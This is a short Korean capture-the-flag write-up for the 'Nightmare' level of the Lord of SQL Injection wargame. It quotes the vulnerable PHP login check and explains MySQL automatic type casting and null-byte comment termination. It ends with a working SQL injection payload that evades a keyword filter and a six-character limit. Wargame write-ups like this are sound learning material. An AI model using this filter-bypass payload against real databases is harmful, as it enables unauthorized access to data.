# Lord of SQL Injection No.18 - Nightmare
## 문제 출제 의도
1. MySQL Auto Casting의 이해 여부를 확인. 
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
    $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("nightmare"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ GET방식으로 입력한 pw값이 7자리 이상이면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
## 문제 해결
1. Query문 추가
    - 주석 우회
        1. ;%00은 주석역할을 한다.
        2. /* 또한 주석의 자리에 들어갈 수 있지만 MySql 5.1 버전 이하에서만 가능하다.
    - 자동 형 변환
        * MySql에서 문자열 관련 자료형이 숫자 자료형으로 변환되는 경우 문자열에서 문자가 나오기 전에 나오는 숫자만 변환된다.
        * 다음은 그 예이다.
        ~~~
        "12xdsf"+ 3 = 12
        "kkqa23231" + 4 = 0
        "1kas331" + 10 = 1
        ~~~
    - 다음과 유사한 방법으로 문제 해결이 가능하다.
        ~~~
        ?pw='%2b0);%00
        ~~~  